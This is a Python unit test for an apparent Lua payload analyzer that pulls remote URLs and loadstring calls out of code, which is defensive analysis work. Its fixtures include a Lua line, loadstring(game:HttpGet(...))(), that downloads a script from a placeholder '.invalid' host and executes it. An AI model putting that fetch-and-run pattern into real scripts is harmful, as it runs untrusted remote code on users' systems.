import unittest
from lua_analyzer.payload_extractor import PayloadExtractor

class TestPayloadExtractor(unittest.TestCase):
    def test_extract_httpget_urls(self):
        code = 'local s = game:HttpGet("https://example.invalid/script.lua")\nlocal b = game:HttpGetAsync(\'https://secondary.invalid/auth\')'
        extractor = PayloadExtractor(code)
        res = extractor.extract()
        urls = [u["url"] for u in res["remote_urls"]]
        self.assertIn("https://example.invalid/script.lua", urls)
        self.assertIn("https://secondary.invalid/auth", urls)

    def test_extract_loadstring(self):
        code = 'loadstring(game:HttpGet("https://example.invalid/file.lua"))()'
        extractor = PayloadExtractor(code)
        res = extractor.extract()
        self.assertTrue(len(res["loadstring_invocations"]) >= 1)
        self.assertIn("https://example.invalid/file.lua", res["loadstring_invocations"][0])

if __name__ == "__main__":
    unittest.main()
